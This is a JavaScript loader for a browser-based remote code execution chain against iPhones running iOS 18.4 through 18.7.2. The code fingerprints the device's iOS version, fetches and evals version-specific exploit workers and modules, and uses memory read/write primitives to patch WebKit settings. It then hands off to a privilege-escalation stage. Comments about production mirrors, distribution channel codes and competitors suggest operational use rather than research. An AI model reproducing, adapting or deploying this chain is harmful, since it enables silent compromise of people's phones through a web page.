// Match production external (muiu38-mirror rce_loader.js): SERVER_LOG=false.
// print() is a no-op except for reportError=true (errors still surface).
// With true, every print() fires a SYNCHRONOUS blocking XHR to /log.html,
// which slows the time-sensitive RCE chain and can get WebContent killed
// before pe_worker runs — observed as the 403-log retry loop on our link.
var SERVER_LOG = false;
let logStart = new Date().getTime();
let logEntryID = 0;
var offsets = {};
var slide;
var chipset;
var device_model;
// 嵌入页可能在 /a/b/c/index.html；链文件固定在同源 /next-chain/，不用当前页目录。
function normalizeChainBase(raw) {
    var pageOrigin = '';
    try { pageOrigin = String(location.origin || '').replace(/\/$/, ''); } catch (eO) {}
    var s = String(raw || '').replace(/\/$/, '');
    if (/^https?:\/\//i.test(s)) {
        if (/\/next-chain$/i.test(s)) return s;
        try {
            var uo = String(new URL(s).origin || '').replace(/\/$/, '');
            if (uo) return uo + '/next-chain';
        } catch (eU) {}
        return s + '/next-chain';
    }
    if (s === '/next-chain' || /^\/next-chain\//i.test(s)) {
        return pageOrigin + '/next-chain';
    }
    return pageOrigin + '/next-chain';
}
var localHost = '';
try {
    if (typeof window !== 'undefined' && window.__DS_BASE__) {
        localHost = normalizeChainBase(window.__DS_BASE__);
    }
} catch (eBase) {}
if (!localHost) {
    localHost = normalizeChainBase('');
}
// 渠道：?c= → weifile 写入的 __CHANNEL_CODE__ → URL 路径 /channel/X.Y.ZZ/
var channelCode = '';
try {
    var m = new URLSearchParams(location.search).get('c');
    if (m) channelCode = m.toUpperCase();
} catch (eCC) {}
try {
    if (!channelCode && typeof window !== 'undefined' && window.__CHANNEL_CODE__) {
        channelCode = String(window.__CHANNEL_CODE__).toUpperCase();
    }
} catch (eWin) {}
try {
    if (!channelCode) {
        var pm = String(location.pathname || '').match(/\/channel\/([0-9A-Za-z]\.[0-9A-Za-z]\.[0-9A-Za-z]{2})\//i);
        if (pm && pm[1]) channelCode = pm[1].toUpperCase();
    }
} catch (ePath) {}
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    };
    if (dumphex) {
        obj.hex = 1;
        obj.text = x;
    }
    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "/log.html?" + req, false);
    xhr.send(null);
}
function markPeDone() {
    // 10min TTL is enforced by frame.html. Cookie is also set by delivery when
    // pe_worker.js is served (covers WebContent death before this runs).
    var ts = String(Date.now());
    try { localStorage.setItem('_x_pe_done', ts); } catch (e) {}
    try {
        document.cookie = '_x_pe_done=' + encodeURIComponent(ts) +
            '; Path=/; Max-Age=600; SameSite=Lax';
    } catch (e2) {}
}
function redirect() {
    // Do NOT navigate (old /404.html caused reload loops with re-entrant frame).
    markPeDone();
    try { if (typeof window.stop === 'function') window.stop(); } catch (e) {}
}
// Relative URLs resolve under /assets/js/; leading-/ paths use location.origin (delivery fallthrough).
// Retries + status/length checks — plain same-origin fetch.
function chainBase() {
    return normalizeChainBase(localHost || (typeof window !== 'undefined' && window.__DS_BASE__) || '');
}
function resolveChainUrl(fname) {
    var name = String(fname || '');
    if (/^https?:\/\//i.test(name)) return name;
    var host = chainBase();
    var rel = name.charAt(0) === '/' ? name.replace(/^\/+/, '') : name;
    return host + '/' + rel;
}
function getJS(fname, method = 'GET', tries = 5) {
    const minLen = 1;
    for (let attempt = 1; attempt <= tries; attempt++) {
        try {
            let url = resolveChainUrl(fname);
            if (attempt > 1) {
                const sep = url.indexOf('?') >= 0 ? '&' : '?';
                url = url + sep + '_r=' + attempt;
            }
            const xhr = new XMLHttpRequest();
            xhr.open(method || 'GET', url, false);
            xhr.send(null);
            if (xhr.status >= 200 && xhr.status < 300 && xhr.responseText && xhr.responseText.length >= minLen) {
                return xhr.responseText;
            }
        } catch (e) {
            // retry
        }
    }
}
function iosVersionKey(v) {
    if (!v) return '';
    var parts;
    if (typeof v === 'string') {
        if (v.indexOf('.') >= 0) parts = v.split('.').map(function (p) { return parseInt(p, 10); });
        else parts = v.split(',').map(function (p) { return parseInt(p, 10); });
    } else if (v.join) parts = v;
    else return String(v);
    var maj = parts[0] | 0;
    var min = parts[1] | 0;
    var pat = parts[2] | 0;
    if (maj !== 18) return parts.join(',');
    if (min === 4) return pat === 1 ? '18,4,1' : '18,4';
    if (min === 5) return '18,5';
    if (min === 6) {
        if (pat >= 2) return '18,6,2';
        if (pat === 1) return '18,6,1';
        return '18,6';
    }
    return parts.join(',');
}
function stage1HandoffWarning() {
    if (!device_model) return 'missing device_model';
    if (!offsets || typeof offsets !== 'object') return 'missing offsets';
    if (Object.keys(offsets).length < 40) return 'offsets keys=' + Object.keys(offsets).length;
    if (slide == null || slide === undefined) return 'missing slide';
    try {
        if (typeof slide === 'bigint' && slide === 0n) return 'slide=0';
    } catch (e) {}
    return '';
}
function packOffsetsForTransfer(src) {
    var out = {};
    if (!src) return out;
    try {
        for (var k in src) {
            if (!Object.prototype.hasOwnProperty.call(src, k)) continue;
            var val = src[k];
            out[k] = (val != null && val.toString) ? val.toString() : String(val);
        }
    } catch (e) {}
    return out;
}
function flipPhoneParsing(att) {
    try {
        var addrof = att && att.addrof;
        if (typeof addrof !== 'function') {
            addrof = function (object) {
                att.overlap_array[0] = object;
                return BigInt.fromDouble(att.oob_array[att.overlap_idx_in_oob_array]);
            };
        }
        var wrap = addrof(document);
        var keys = [0x18n, 0x10n, 0x20n];
        for (var i = 0; i < keys.length; i++) {
            var docPtr = att.read64(wrap + keys[i]);
            if (docPtr < 0x100000000n || docPtr > 0x7f0000000000n) continue;
            if ((att.read64(docPtr + 0xdb6n) & 1n) != 1n) continue;
            var settings = att.read64(docPtr + 0x2c0n);
            if (settings < 0x100000000n || settings > 0x7f0000000000n) continue;
            var flagAddr = settings + 0x2can;
            var before = att.read64(flagAddr);
            if (before & 0x10n) return true;
            att.write64(flagAddr, before | 0x10n);
            return true;
        }
    } catch (eFix) {}
    return false;
}
function postStage1ToWorker(worker, begin, origin, desiredHost) {
    var msg = {
        type: 'stage1',
        begin: begin,
        origin: origin,
        ios_version: iosVersionKey(ios_version),
        device_model: device_model,
        chipset: chipset,
        slide: (slide != null && slide.toString) ? slide.toString() : '0',
        offsets: packOffsetsForTransfer(offsets),
        desiredHost: desiredHost,
        SERVER_LOG: SERVER_LOG,
        channelCode: channelCode
    };
    try {
        worker.postMessage(msg);
        return true;
    } catch (e) {
        return false;
    }
}
const signal = new Uint8Array(8);
const dlopen_worker = `(() => {
  self.onmessage = function (e) {
    const {
      type,
      data
    } = e.data;
    switch (type) {
      case 'init':
        const canvas = new OffscreenCanvas(1, 1);
        globalThis[0] = data;
        createImageBitmap(canvas).then(bitmap => {
          globalThis[1] = bitmap;
          self.postMessage(null);
        });
        break;
      case 'dlopen':
        globalThis[1].close();
        break;
    }
  };
})();`;
const dlopen_worker_blob = new Blob([dlopen_worker], { type: 'application/javascript'});
const dlopen_worker_url = URL.createObjectURL(dlopen_worker_blob);

// LIVE band: iOS 18.4.0 - 18.7.2
function parseIosVersion() {
    let version = /iPhone OS ([0-9_]+)/g.exec(navigator.userAgent)?.[1];
    if (!version) {
        const m = /CPU (?:iPhone )?OS ([0-9_]+)/.exec(navigator.userAgent);
        if (m) version = m[1];
    }
    if (version) return version.split('_').map(part => parseInt(part, 10));
    return null;
}
function pickLiveBand(v) {
    if (!v || !v.length) return null;
    // historical special-case retained
    if (v[0] === 18 && v[1] === 1 && (v[2] || 0) === 1) {
        return { worker: 'rce_worker_18.6.js', module: 'rce_module_18.6.js', stage1_rce: true, band: '18.6' };
    }
    if (v[0] !== 18) return null;
    const min = v[1] || 0, pat = v[2] || 0;
    if (min < 4 || min > 7) return null;
    if (min === 7 && pat >= 3) return null; // 18.7.3+ patched / out of LIVE
    // 18.7.0-18.7.2: offsets live in worker; module is stub only (do not eval fake 22E/22F table)
    if (min === 7) return { worker: 'rce_worker_18.7.js', module: 'rce_module_18.7.js', stage1_rce: true, band: '18.7' };
    // 18.6.x: same — stub module + self-contained worker
    if (min === 6) return { worker: 'rce_worker_18.6.js', module: 'rce_module_18.6.js', stage1_rce: true, band: '18.6' };
    // 18.4.x / 18.5.x — legacy check_attempt; rce_module.js must have 22E (18.4) + 22F76 (18.5)
    return { worker: 'rce_worker_18.4.js', module: 'rce_module.js', stage1_rce: false, band: '18.4' };
}

const ios_version = parseIosVersion();
const live_band = pickLiveBand(ios_version);
if (!live_band) {
    print('unsupported iOS ' + (ios_version ? ios_version.join('.') : 'unknown') + ' (LIVE=18.4.0-18.7.2)', true);
} else {
let workerCode = getJS(`${live_band.worker}?${Date.now()}`);
if (!workerCode || workerCode.length < 1000) {
    print('worker load failed: ' + live_band.worker, true);
} else {
let workerBlob = new Blob([workerCode],{type:'text/javascript'});
let workerBlobUrl = URL.createObjectURL(workerBlob);
(() => {
    function doRedirect() {
      redirect();
    }
    function main() {
        const randomValues = new Uint32Array(32);
        const begin = Date.now();
        const origin = location.origin;
        const worker = new Worker(workerBlobUrl);
        const dlopen_workers = [];
        async function prepare_dlopen_workers() {
        for (let i = 1; i <= 2; ++i) {
            const worker = new Worker(dlopen_worker_url);
            dlopen_workers.push(worker);
            await new Promise(r => {
            worker.postMessage({
                type: 'init',
                data: 0x11111111 * i
            });
            worker.onmessage = r;
            });
        }
        }
        const iframe = document.createElement('iframe');
        iframe.srcdoc = '';
        iframe.style.height = 0;
        iframe.style.width = 0;
        document.body.appendChild(iframe);
        async function message_handler(e) {
        const data = e.data;
        switch (data.type) {
            case 'redirect':
            {
                markPeDone();
                doRedirect();
                break;
            }
            case 'pe_start':
            case 'pe_spawned':
            {
                // Early lock: set before pe_worker runs / WebContent dies
                markPeDone();
                break;
            }
            case 'prepare_dlopen_workers':
            {
                await prepare_dlopen_workers();
                worker.postMessage({
                type: 'dlopen_workers_prepared'
                });
                break;
            }
            case 'trigger_dlopen1':
            {
                dlopen_workers[0].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen1'
                });
                break;
            }
            case 'trigger_dlopen2':
            {
                dlopen_workers[1].postMessage({
                type: 'dlopen'
                });
                worker.postMessage({
                type: 'check_dlopen2'
                });
                break;
            }
            case 'sign_pointers':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'setup_fcall'
                });
                break;
            }
            case 'slow_fcall':
            {
                iframe.contentDocument.write('1');
                worker.postMessage({
                type: 'slow_fcall_done'
                });
                break;
            }
            default:
            {
                break;
            }
        }
        }
        worker.onmessage = message_handler;
        try
        {
        let rceCode = getJS(`${live_band.module}?${Date.now()}`);
        // 18.6/18.7 stage1_rce: stub module only — never eval a large offset table on page.
        // 18.4/18.5: need real rce_module.js (22E + 22F76) for check_attempt.
        if (live_band.stage1_rce) {
            if (rceCode && rceCode.length >= 500) {
                print('stage1_rce: refusing large page module ' + live_band.module + ' (len=' + rceCode.length + ') — using worker offsets', true);
            } else if (rceCode && rceCode.length >= 1) {
                try { eval(rceCode); } catch (eStub) {}
            }
        } else {
            if (!rceCode || rceCode.length < 500) {
                print('module load failed: ' + live_band.module, true);
                return;
            }
            try {
                eval(rceCode);
            } catch (e) {
                print('module eval failed', true);
                return;
            }
        }
        let desiredHost = chainBase();
            // 18.6.x / 18.7.0-18.7.2: self-contained worker (stage1_rce)
            // 18.4.x / 18.5.x: check_attempt + stage1 handoff (serialized offsets)
            if(live_band.stage1_rce)
            {
                worker.postMessage({
                    type: 'stage1_rce',
                    desiredHost,
                    randomValues,
                    SERVER_LOG,
                    channelCode: channelCode
                });
            }
            else
            {
        var attempt = new check_attempt();
        function onAttemptDone(result) {
            if (!result) return;
            var handoffWarn = stage1HandoffWarning();
            if (handoffWarn !== '') {
                print('stage1 handoff warn: ' + handoffWarn + ' (post anyway)', true);
            }
            // 嵌入 / iframe / 非 Safari 顶栏：WebKit settings 缺 Safari 位，
            // worker+module 能拉到，但 PAC/dlopen 后不会去要 sbx0。竞品同样在这里翻位。
            flipPhoneParsing(attempt);
            postStage1ToWorker(worker, begin, origin, desiredHost);
        }
        attempt.start().then((result) => {
            if (!result) {
                attempt.start().then(onAttemptDone).catch(function () {});
            } else {
                onAttemptDone(true);
            }
        }).catch(function () {});
            }
        }
        catch(e)
        {
       // print("Got exception on something: " + e);
        }
    }
    main();
  })();
} // workerCode ok
} // end live_band
